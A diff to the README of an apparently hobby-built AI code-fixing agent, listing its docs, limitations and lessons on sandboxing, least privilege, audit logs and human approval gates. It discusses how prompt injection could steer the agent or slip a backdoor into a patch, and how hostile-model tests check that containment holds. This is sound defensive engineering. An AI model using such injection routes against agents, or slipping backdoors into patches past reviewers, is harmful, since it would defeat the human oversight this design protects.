-gVisor/Firecracker runner · per-user quotas and rate limiting · WebSocket live updates · multi-repo policy profiles ·
-GitHub App installation-token flow · richer rule-based and LLM fixers · replay-protected webhooks.
+| Document | What's in it |
+|---|---|
+| [`SECURITY.md`](SECURITY.md) | security controls, the full threat register, known limitations |
+| [`docs/architecture.md`](docs/architecture.md) | module map, request flow, permission levels, state machine |
+| [`docs/threat-model.md`](docs/threat-model.md) | trust boundaries, an attack walkthrough, mitigation-to-test matrix |
+| [`docs/deployment.md`](docs/deployment.md) | Compose and Windows setup, Trivy in the read-only sandbox, GitHub setup, troubleshooting, production checklist |
+| [`docs/ui-states.md`](docs/ui-states.md) | what each UI state shows |
+| [`docs/example-audit-log.txt`](docs/example-audit-log.txt) | a recorded audit trail, including denied attacks |
+
+## Project status and limitations
+
+AESA is a learning project that has **not been independently audited**. Please read this before pointing it at anything valuable.
+
+- **The default AI provider is a rule-based stand-in, not an LLM.** It fixes a few classic insecure idioms so the demo works offline.
+  Real models plug in through `AI_PROVIDER`; their patches can be worse, which is what the gate and the reviewer are for.
+- **Not covered by automated tests:** live GitHub (PRs, Actions, webhooks), live LLM providers and PostgreSQL. They are exercised only
+  against mocked transports or not at all.
+- **Docker isolation shares the host kernel.** For hostile repositories use gVisor, Kata or rootless Docker. The `local` sandbox backend
+  has no isolation and is for development only.
+- **Prompt injection can still influence the *content* of a patch.** The backend stops a manipulated model from acting, but a subtle
+  backdoor in a diff is the reviewer's job.
+- **Permitted source files are sent to your AI provider.** Choose the provider and data terms accordingly.
+- "Request changes" ends the task rather than re-running the agent with feedback. The login throttle is in-memory and there is no
+  server-side token revocation yet.
+- The workspace is not writable by the sandbox user, so a target repo whose tests write into the working directory will fail.
+
+## Roadmap
+
+Re-run the agent with reviewer feedback · SBOM and signed commits or attestations · external anchoring of the audit hash chain ·
+gVisor or Firecracker runner · per-user quotas and API rate limiting · live updates over WebSockets · multi-repository policy profiles ·
+GitHub App installation-token flow · replay-protected webhooks.
 
 ## What I Learned
 
-**AI agent architecture.** An agent is a loop around an untrusted proposer: *propose → validate → authorize → execute →
-observe*. The valuable engineering is everything *around* the model. A single choke point (`ToolExecutor`) that every
-action must pass made it possible to guarantee validation, policy, redaction, and auditing without trusting each
-handler to remember them.
+- **AI agent architecture.** An agent is a loop around an *untrusted proposer*: propose → validate → authorize → execute → observe. The
+  valuable engineering is everything around the model. One choke point that every action must pass made it possible to guarantee
+  validation, policy, redaction and auditing without trusting each handler to remember them.
+- **Tool calling.** A plain JSON-action protocol gave one code path for OpenAI-compatible servers and Gemini. Strict schemas turn
+  hallucinated or malformed calls into logged rejections, and a tool that isn't in the registry simply doesn't exist.
+- **Least privilege.** Make the dangerous things *structurally unavailable* rather than merely forbidden: commit, push and deploy are
+  backend actions that run only after a human decision; the agent's level is clamped in code; the policy context is built from
+  database state, never from anything the model says.
+- **Prompt injection.** Marking untrusted content helps but is only mitigation. The real answer is assuming the injection succeeds and
+  ensuring it has nowhere to go: an obedient model in the tests still has every attack denied.
+- **Sandboxing.** "Analyzing" a repository runs its code (pytest imports `conftest.py`; Git can run `core.fsmonitor`). So: work in a clone
+  of committed content, harden Git, scrub the environment, run repo code only in a locked-down container, and **fail closed** if the
+  sandbox is missing rather than falling back.
+- **Secure CI/CD.** Bind evidence to the artifact. Scans are keyed to the patch hash and approval carries that hash, so old results
+  can't validate different code. A scanner that errors is a failure, not a pass.
+- **GitHub automation.** Use the narrowest token, keep it out of command-line arguments and out of the agent's reach, push only
+  backend-named branches, never force, and rely on server-side branch protection as the backstop.
+- **Human-in-the-loop systems.** A button is not a control unless the server enforces what it implies: separation of duties, a state
+  machine that can't skip states, a second approval for deployment, and server-side re-checks of everything the UI shows.
+- **Auditability.** Log denials as carefully as successes, redact before storing, make the log append-only at the database level, and
+  hash-chain entries so tampering is detectable.
+- **DevSecOps.** Test tools the way production runs them. A mypy crash survived my tests because the test sandbox ran as the
+  workspace owner, while production runs as a different, unprivileged user on a directory it can't write. Also lint *every* Python file,
+  not just the main package, and gate the pipeline on all of it.
+- **AI security risks.** The risks that matter are mostly classic ones amplified by autonomy (injection, excessive agency, secret
+  exposure, supply chain, denial of service), plus one unique to LLMs: your source code goes to a provider. Be honest about residual risk.
 
-**Tool calling.** I used a plain JSON-action protocol instead of vendor function-calling so OpenAI-compatible servers
-and Gemini share one code path. Strict schemas (`extra="forbid"`, enums, length limits) turn hallucinated or malformed
-calls into logged rejections instead of surprises, and a tool that isn't in the registry simply doesn't exist.
+## License and security
 
-**Least privilege.** Give the agent the minimum, and make the rest *structurally* unavailable rather than merely
-forbidden: commit/push/PR/deploy are backend actions that run only after a human decision; the agent level is clamped in
-code; the agent cannot edit CI, sandbox, or policy files. The policy context is built from database state, never from
-anything the model says.
-
-**Prompt injection.** Wrapping untrusted content in markers helps, but it is mitigation, not protection. The real answer is
-assuming the injection succeeds and ensuring it has nowhere to go: the hostile-model tests show an obedient model still
-gets 15/15 actions denied. What it *can* still influence is the patch content, which is why the human diff review and
-the exact-patch scan gate matter.
-
-**Sandboxing.** Untrusted repos run code even when you only "analyze" them (pytest imports `conftest.py`; git can run
-`core.fsmonitor`). So: analyze a clone of committed content only, harden git, scrub the environment, run repo code only in
-a locked-down container (non-root, no network, no caps, read-only, limits), and **fail closed** if the sandbox is missing
-instead of silently falling back. I also learned how easy it is to mistake a dev convenience (`local` backend) for a boundary.
-
-**Secure CI/CD.** Bind evidence to the artifact: scans are keyed to the patch hash and approval carries that hash, so old
-results or an old approval can't validate different code. A scanner that errors is a *failure*, not a pass. Protect the
-checks themselves (the agent can't modify workflows) and put the human gate in the pipeline (`production` environment reviewers).
-
-**GitHub automation.** Use the narrowest token, keep it out of argv (pass via git's env config) and out of the agent's
-reach, push only backend-named branches with explicit refspecs, never force, and rely on server-side branch protection as
-the backstop for a leaked token.
-
-**Human-in-the-loop systems.** A button is not a control unless the server enforces what it implies: separation of duties
-(no self-approval, approvers can't start tasks), a state machine that can't skip states, a second approval for deployment,
-and a UI that shows exactly what will be applied (diff, risk, checks) and disables approval when the gate fails, while the
-*server* re-checks all of it.
-
-**Auditability.** Log denials as carefully as successes. Redact before storing, make the log append-only at the database
-level, and hash-chain entries so tampering is detectable. A subtle practical lesson: audit writes and SQLite's single writer
-interact. Committing each audit entry promptly avoids self-inflicted lock contention.
-
-**DevSecOps.** Security checks are only useful if they run on the thing you ship and fail loudly. Building this surfaced real
-issues: my own `npm audit` found a critical/high toolchain advisory set (fixed by upgrading Vite, Vitest, Tailwind, React
-Router), bandit's `-x tests` silently didn't match `./tests`, and a test-fixture `noqa` hid an import-order problem that the
-agent's generated patch also exposed. Gate the pipeline on these and fix root causes.
-
-**AI security risks.** The risks that matter are mostly classic ones amplified by autonomy (injection, excessive agency,
-secret exposure, supply chain, DoS), plus data-handling ones unique to LLMs: your source goes to a provider. Be honest about
-residual risk: reviewers can miss a subtle backdoor, shared-kernel containers aren't perfect isolation, and untested paths
-(Docker, live GitHub here) are untested, so I said so in this README.
+Released under the [MIT License](LICENSE). To report a vulnerability, see [`SECURITY.md`](SECURITY.md).
